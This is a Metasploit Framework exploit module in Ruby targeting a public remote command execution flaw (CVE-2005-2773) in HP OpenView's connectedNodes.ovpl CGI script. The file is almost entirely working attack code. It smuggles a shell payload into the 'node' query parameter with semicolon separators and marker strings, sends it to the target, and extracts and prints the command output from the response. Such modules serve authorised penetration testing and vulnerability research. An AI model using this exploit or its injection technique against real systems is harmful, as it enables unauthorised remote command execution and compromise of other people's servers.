##
# $Id: openview_connectednodes_exec.rb 4529 2007-03-12 01:08:18Z hdm $
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/
##


require 'msf/core'

module Msf

class Exploits::Unix::Webapp::OpenView_ConnectedNodes_Execution < Msf::Exploit::Remote

	include Exploit::Remote::Tcp
	include Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'HP Openview connectedNodes.ovpl Remote Command Execution',
			'Description'    => %q{
				This module exploits an arbitrary command execution vulnerability in the
			HP OpenView connectedNodes.ovpl CGI application. The results of the command
			will be displayed to the screen.
			},
			'Author'         => [ 'Valerio Tesei <valk[at]mojodo.it>', 'hdm' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 4529 $',
			'References'     =>
				[
					['OSVDB', '19057'],
					['BID', '14662'],
					['CVE', '2005-2773'],
				],
			'Privileged'     => false,
			'Payload'        =>
				{
					'DisableNops' => true,
					'Space'       => 1024,
				},
			'Platform'       => 'unix',
			'Arch'           => ARCH_CMD,
			'Targets'        => [[ 'Automatic', { }]],
			'DisclosureDate' => 'Aug 25 2005',
			'DefaultTarget' => 0))
			
			register_options(
				[
					OptString.new('URI', [true, "The full URI path to connectedNodes.ovpl", "/OvCgi/connectedNodes.ovpl"]),
				], self.class)
	end

	def exploit
	
		# Trigger the command execution bug
		res = send_request_cgi({
			'uri'      => datastore['URI'],
			'vars_get' => 
			{
				'node'    => %Q!; echo YYY; #{payload.encoded}; echo YYY| tr "\\n" "#{0xa3.chr}"!
			}
		}, 25)		
		
		if (res)
			print_status("The server returned: #{res.code} #{res.message}")
			print("")
			
			m = res.body.match(/YYY(.*)YYY/)
			
			if (m)
				print_status("Command output from the server:")
				print(m[1])
			else
				print_status("This server may not be vulnerable")
			end
			
		else
			print_status("No response from the server")
		end
	end
	
end
end	
